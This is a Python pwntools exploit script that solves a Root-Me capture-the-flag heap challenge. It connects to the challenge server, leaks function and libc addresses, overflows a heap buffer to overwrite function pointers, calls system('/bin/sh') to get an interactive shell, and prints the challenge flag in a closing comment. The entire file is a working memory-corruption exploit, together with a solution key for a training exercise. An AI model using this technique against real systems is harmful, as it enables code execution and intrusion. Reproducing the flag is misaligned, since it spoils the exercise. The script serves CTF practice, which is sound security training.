#!/usr/bin/python

from pwn import *
import binascii

context.log_level = 'info'

r = remote('challenge04.root-me.org', 61048)

print(r.recvuntil('>'))

commands = open('commands', 'r').read().split('\n')

for c in commands:
    r.sendline(c)
    answer = r.recv()
    print(answer)

a = answer.split('\n')[0]

leak_show = u32(a[-7:-3])
target_text = leak_show+70336+17*16
target_text_puts = leak_show+70336+18*16
print("[+] Leak of show function found : "+hex(leak_show))
print("[+] Leak of target text puts function found : "+hex(target_text_puts))

X = 264
modify_print_known = ["", "4", "5", "1", "1", str(X+8), "a"*X+p32(leak_show)+p32(target_text), "3", "4"]
for c in modify_print_known:
    r.sendline(c)
    answer = r.recv()
    print(answer)
r.recv()

leak_lib = u32(answer[:4])
leak_system = leak_lib-99973
leak_bin_sh = leak_lib+545851
print("[+] Leak of system found : "+hex(leak_system))
print("[+] Leak of bin/sh found : "+hex(leak_bin_sh))

modify_print_known = ["4", "6", "1", "1", str(X+8), "a"*X+p32(leak_show)+p32(target_text_puts), "3", "4"]
for c in modify_print_known:
    r.sendline(c)
    answer = r.recv()
    print(answer)
r.recv()

leak_puts = u32(answer[:4])
leak_system_confirm = leak_puts-105528
print("[+] Leak of puts found : "+hex(leak_puts)+" and confirming system : "+hex(leak_system_confirm))

modify_print_known = ["4", "7", "1", "1", str(X+8), "a"*X+p32(leak_system_confirm)+p32(leak_bin_sh), "3", "4"]
for c in range(len(modify_print_known)):
    r.sendline(modify_print_known[c])
    if c+1<len(modify_print_known):
        answer = r.recv()
        print(answer)

r.interactive()

#h34ps_@re_w0n_with_0ff_by_0n
